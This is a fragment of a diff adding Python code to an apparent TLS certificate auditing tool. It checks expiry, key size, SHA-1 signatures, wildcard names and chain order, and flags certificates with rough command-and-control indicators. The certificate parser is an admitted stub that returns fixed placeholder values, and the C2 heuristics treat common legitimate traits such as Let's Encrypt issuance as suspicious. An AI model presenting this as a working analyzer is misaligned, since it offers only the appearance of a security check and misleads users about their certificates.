+                    'description': 'Self-signed certificate detected',
+                })
+
+            # Check for expired certificate
+            if cert_info.is_expired:
+                findings.append({
+                    'type': 'expired_certificate',
+                    'severity': 'critical',
+                    'certificate': cert_info.subject,
+                    'expired_on': cert_info.not_after,
+                })
+
+            # Check for weak key
+            if cert_info.key_size < 2048 and cert_info.key_type == 'RSA':
+                findings.append({
+                    'type': 'weak_key',
+                    'severity': 'high',
+                    'certificate': cert_info.subject,
+                    'key_type': cert_info.key_type,
+                    'key_size': cert_info.key_size,
+                })
+
+            # Check for weak signature algorithm
+            if 'sha1' in cert_info.signature_algorithm.lower():
+                findings.append({
+                    'type': 'weak_signature',
+                    'severity': 'high',
+                    'certificate': cert_info.subject,
+                    'algorithm': cert_info.signature_algorithm,
+                })
+
+            # Check for wildcard certificate
+            if any(san.startswith('*.') for san in cert_info.san):
+                findings.append({
+                    'type': 'wildcard_certificate',
+                    'severity': 'info',
+                    'certificate': cert_info.subject,
+                    'wildcards': [s for s in cert_info.san if s.startswith('*.')],
+                })
+
+        # Check chain validation
+        chain_findings = self._validate_chain()
+        findings.extend(chain_findings)
+
+        return findings
+
+    def _parse_certificate(self, cert_data: bytes) -> TLSCertificateInfo:
+        """Parse a DER-encoded certificate."""
+        # Simplified - real implementation would use cryptography library
+        return TLSCertificateInfo(
+            subject='',
+            issuer='',
+            serial_number='',
+            not_before=datetime.now(),
+            not_after=datetime.now(),
+            san=[],
+            key_type='RSA',
+            key_size=2048,
+            signature_algorithm='SHA256withRSA',
+            is_self_signed=False,
+            is_expired=False,
+            days_until_expiry=365,
+            sha1_fingerprint=hashlib.sha1(cert_data).hexdigest(),
+            sha256_fingerprint=hashlib.sha256(cert_data).hexdigest(),
+        )
+
+    def _validate_chain(self) -> List[dict]:
+        """Validate the certificate chain."""
+        findings = []
+
+        if len(self.certificates) == 0:
+            return findings
+
+        # Check if chain is complete
+        if len(self.certificates) < 2:
+            findings.append({
+                'type': 'incomplete_chain',
+                'severity': 'medium',
+                'description': 'Certificate chain has fewer than 2 certificates',
+            })
+
+        # Check if leaf certificate matches intermediate
+        for i in range(len(self.certificates) - 1):
+            leaf = self.certificates[i]
+            issuer = self.certificates[i + 1]
+            if leaf.issuer != issuer.subject:
+                findings.append({
+                    'type': 'chain_mismatch',
+                    'severity': 'critical',
+                    'description': f'Certificate {i} issuer does not match certificate {i+1} subject',
+                })
+
+        return findings
+
+    def fingerprint_certificates(self) -> List[dict]:
+        """Generate fingerprints for all certificates."""
+        fingerprints = []
+        for cert in self.certificates:
+            fingerprints.append({
+                'subject': cert.subject,
+                'sha1': cert.sha1_fingerprint,
+                'sha256': cert.sha256_fingerprint,
+                'issuer': cert.issuer,
+                'valid_until': cert.not_after.isoformat(),
+            })
+        return fingerprints
+
+    def detect_c2_certificates(self, certificates: List[TLSCertificateInfo]) -> List[dict]:
+        """Identify certificates commonly associated with C2 infrastructure."""
+        c2_indicators = []
+
+        for cert in certificates:
+            # Short-lived certificates (< 30 days)
+            days_valid = (cert.not_after - cert.not_before).days
+            if days_valid < 30:
+                c2_indicators.append({
+                    'type': 'short_lived_certificate',
+                    'subject': cert.subject,
+                    'validity_days': days_valid,
+                    'reason': 'C2 infrastructure often uses short-lived certificates',
+                })
+
+            # Let's Encrypt certificates on suspicious domains
+            if 'Let\'s Encrypt' in cert.issuer:
+                c2_indicators.append({
+                    'type': 'free_certificate',
+                    'subject': cert.subject,
+                    'issuer': cert.issuer,
+                    'reason': 'Frequently used by C2 infrastructure for free TLS',
+                })
+
+            # Certificates with organization field missing
+            if 'O=' not in cert.subject:
+                c2_indicators.append({
+                    'type': 'missing_organization',
+                    'subject': cert.subject,
+                    'reason': 'Certificates without organization are common in C2',
+                })
+
+        return c2_indicators
+```
